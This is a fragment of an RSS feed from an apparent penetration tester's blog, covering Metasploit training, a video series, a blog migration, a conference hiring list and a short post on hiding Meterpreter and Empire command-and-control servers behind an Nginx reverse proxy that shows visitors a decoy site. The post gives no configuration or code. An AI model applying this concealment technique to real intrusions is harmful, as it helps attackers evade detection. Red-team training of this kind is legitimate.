    
    <item>
      <title>BlackHat USA 2016</title>
      <link>https://room362.com/post/2016/blackhat-usa-2016/</link>
      <pubDate>Sun, 01 May 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/blackhat-usa-2016/</guid>
      <description>&lt;p&gt;Once again, &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; and I will be teaching both our &lt;a href=&#34;https://www.blackhat.com/us-16/training/abilities-inc-metasploit-basics.html&#34;&gt;Metasploit Basics&lt;/a&gt; course as well as the &lt;a href=&#34;https://www.blackhat.com/us-16/training/abilities-inc-metasploit-mastery.html&#34;&gt;Mastery Course&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/training/index.html&#34;&gt;&lt;img src=&#34;https://room362.com/images/2016/bh16usa.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Minute</title>
      <link>https://room362.com/post/2016/metasploit-minute/</link>
      <pubDate>Mon, 04 Apr 2016 15:00:00 -0400</pubDate>
      
      <guid>https://room362.com/post/2016/metasploit-minute/</guid>
      <description>&lt;p&gt;Metasploit Minute Season 6 is on the air! I know we have been away for a long
while. The first episode is posted &lt;a href=&#34;https://www.patreon.com/posts/5083466&#34;&gt;https://www.patreon.com/posts/5083466&lt;/a&gt; each Monday a link will be posted on the Patreon site, or if you find RSS feeds easier, you can find it over at &lt;a href=&#34;http://metasploitminute.com&#34;&gt;http://metasploitminute.com&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Another Blogging Platform</title>
      <link>https://room362.com/post/2016/another-blogging-platform/</link>
      <pubDate>Sat, 26 Mar 2016 13:43:09 -0400</pubDate>
      
      <guid>https://room362.com/post/2016/another-blogging-platform/</guid>
      <description>&lt;p&gt;Yes yes yes, I know, another platform, but guess what, it&amp;rsquo;s my blog, so ne-ner-ne-ner-ne-ner&lt;/p&gt;

&lt;p&gt;Hugo removed what I didn&amp;rsquo;t like about Octopress (the generating / pushing of content using a mix of branches and such)&lt;/p&gt;

&lt;p&gt;The reason I moved from Blogger was I just can&amp;rsquo;t stand having to log in and be online to make posts. I love things like MarsEdit for doing offline posts to services like Blogger, but I never could get the formatting right when I was done, especiall for code, so I&amp;rsquo;m back to a markdown based system. Mostly because I like how it displays code (yes yes I know you can add highlightjs to blogger too)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://gohugo.io/&#34;&gt;&lt;img src=&#34;https://room362.com/images/2016/hugo.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2016 Shmoocon Hiring List</title>
      <link>https://room362.com/post/2016/2016-shmoocon-hiring-list/</link>
      <pubDate>Mon, 04 Jan 2016 11:30:44 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/2016-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2016 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;http://goo.gl/forms/pbYI0TZ9dG&#34;&gt;http://goo.gl/forms/pbYI0TZ9dG&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&#34;&gt;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; src=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34; width=&#34;900&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Reverse Proxying Attacker Tools</title>
      <link>https://room362.com/post/2015/reverse-proxying-attacker-tools/</link>
      <pubDate>Thu, 31 Dec 2015 16:28:07 -0500</pubDate>
      
      <guid>https://room362.com/post/2015/reverse-proxying-attacker-tools/</guid>
      <description>

&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;

&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://attackerkb.com/Combinations/ReverseProxyAttackTools&#34;&gt;https://attackerkb.com/Combinations/ReverseProxyAttackTools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;

&lt;h3 id=&#34;metasploit&#34;&gt;Metasploit:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;https://room362.com/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;empire&#34;&gt;Empire:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;https://room362.com/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>